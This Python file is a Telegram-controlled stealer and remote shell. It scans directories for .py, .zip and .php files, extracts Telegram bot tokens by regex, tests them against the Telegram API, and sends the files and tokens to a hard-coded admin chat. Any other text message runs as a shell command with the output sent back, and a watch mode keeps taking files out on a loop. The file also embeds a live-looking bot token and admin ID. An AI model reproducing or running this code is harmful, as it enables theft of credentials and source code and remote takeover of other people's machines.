import os
import re
import time
import threading
import telebot
import subprocess
import requests

BOT_TOKEN = "7709717273:AAE42Oqwyl0tSVsCoa52ADiE8rLRi7T9g9c"
ADMIN_ID = 6392238598  # Replace with your Telegram user ID
bot = telebot.TeleBot(BOT_TOKEN)

watching = False
sent_files = set()
TOKEN_REGEX = r'\d{6,}:[A-Za-z0-9_-]{30,}'
scan_path = "."

def extract_tokens(filepath):
    try:
        if filepath.endswith(('.py', '.php')):  # Check tokens in .py and .php files
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                return re.findall(TOKEN_REGEX, content)
        return []
    except:
        return []

def check_token_validity(token):
    try:
        response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
        return response.status_code == 200 and "ok" in response.text
    except:
        return False

def send_file(filepath):
    if filepath in sent_files:
        return
    tokens = extract_tokens(filepath)
    caption = "[+] Token(s) Found:\n" + "\n".join(tokens) if tokens else "[!] No token found."
    try:
        with open(filepath, 'rb') as file:
            bot.send_document(ADMIN_ID, file, caption=caption)
        sent_files.add(filepath)
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error sending {filepath}: {str(e)}")

def scan_directory(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith((".py", ".zip", ".php")):  # Include .php files
                full_path = os.path.join(root, file)
                send_file(full_path)

def watch_directory(path):
    global watching
    while watching:
        scan_directory(path)
        time.sleep(10)

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "Bot is running. Send commands directly or use 'watch_on <path>' or 'watch_off'.")

@bot.message_handler(content_types=['text'])
def handle_commands(message):
    global scan_path, watching
    if message.from_user.id != ADMIN_ID:
        return

    command = message.text.strip()

    if command.startswith("watch_on"):
        parts = command.split(maxsplit=1)
        scan_path = parts[1] if len(parts) == 2 else "."
        if not watching:
            watching = True
            threading.Thread(target=watch_directory, args=(scan_path,), daemon=True).start()
            bot.reply_to(message, f"Watch mode activated for: {scan_path}")
        else:
            bot.reply_to(message, "Watch mode already active.")
    
    elif command.startswith("watch_off"):
        watching = False
        bot.reply_to(message, "Watch mode deactivated.")
    
    elif command.startswith("pull"):
        parts = command.split(maxsplit=1)
        scan_path = parts[1] if len(parts) == 2 else "."
        bot.reply_to(message, f"Pulling .py, .zip, and .php files from: {scan_path}")
        scan_directory(scan_path)
    
    else:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            bot.reply_to(message, result[:4000] or "Command executed successfully.")
        except subprocess.CalledProcessError as e:
            bot.reply_to(message, f"Error:\n{e.output[:4000]}")
        except Exception as e:
            bot.reply_to(message, f"Error executing command: {str(e)}")

bot.infinity_polling()
